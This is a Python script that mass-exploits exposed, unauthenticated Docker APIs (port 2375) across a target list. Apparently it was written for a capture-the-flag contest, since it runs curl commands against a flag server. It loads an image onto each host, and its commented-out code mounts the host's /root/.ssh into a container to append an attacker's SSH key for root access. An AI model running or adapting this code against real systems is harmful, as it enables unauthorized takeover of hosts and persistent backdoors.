from docker import Client
import json
import logging

apiv='1.18'
image="centos:6"
#target="tcp://192.168.6.132:4232"
cmd1='curl http://10.10.10.3:8888/getFlag'
cmd2='curl http://192.168.6.132'

#rsa_pub='ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC4UtCERykpMDSfMcD/XGBzkb4Tt3keV+LGM/NRr7vImTtWOj4CM5hEe8N8aNLLH/UCr87C4tBAChifgWFlykDQggtJzLZjdn9Sxuh0B1P1wCdPR/988gjUESWj3YaNkdAUIhMYG7KFhC2SMr6GFMMNBp3g+1fHv5nwPjSfgq+aljUNFxdzprX/t1BQ3zpJaL1NEE99YGTBg2gWL3SXZJGuxlG3yZMr/V6EDaK24E+BBCYb4S7SkHhfsSqZVy3tK5mGsFnsfvFKhOK89YDyO6I/8MRqoGnexGlK7mfEGupl46m6o2u2pKbB4DWp/XshbDvEsBS1lMAyfsjUPzs5oubH root@kali'
#cmd="echo '"+rsa_pub+"' >> /mnt/authorized_keys"


if __name__=='__main__':
    targets=[]
    l=logging.INFO
    #l=logging.DEBUG
    log_format='%(asctime)s %(message)s'
    logging.basicConfig(level=l,format=log_format,datefmt='%a, %d %b %Y %H:%M:%S',filename='log.log',filemode='a')
    console=logging.StreamHandler()
    console.setLevel(l)
    formatter = logging.Formatter(log_format)
    console.setFormatter(formatter)
    logging.getLogger('').addHandler(console)
    logging.info('------------------------------------Starting working-----------------------------------------')
    for line in open(r'targets.txt','rt').readlines():
        targets.append(line.strip())
    logging.debug(targets)
    print len(targets)
    for target in targets:
        logging.debug("Visiting target [ "+target+" ]...")
        try:
            cli=Client(base_url=target+":2375",version=apiv)
            #print json.dumps(cli.version(),indent=4,sort_keys=True)
            f=open(r'D:\201607\dockercmd\centos.tar','br')
            cli.load_image(f)
            #print cli
            print cli.images()
            print cli.containers(all=True)
            '''
            container=cli.create_container(image=image,command=cmd2)
            #container=cli.create_container(image="centos:6",command='ls /mnt',volumes=['/mnt'],host_config=cli.create_host_config(binds={'/root/.ssh/': {'bind': '/mnt','mode': 'rw'}}))
            cli.start(container.get('Id'))
            logs=cli.attach(container,stream=True)
            for log in  logs:
                logging.info(log)
            '''
        except:
            pass
        logging.debug("End visiting target [ "+target+" ]...")
    logging.info("Work is Done! BYE!!!")

    #cli.create_container(image="cento:6",stdin_open=True,tty=True,command="/bin/bash",volumes=['/root/.ssh'],name="webserver11")
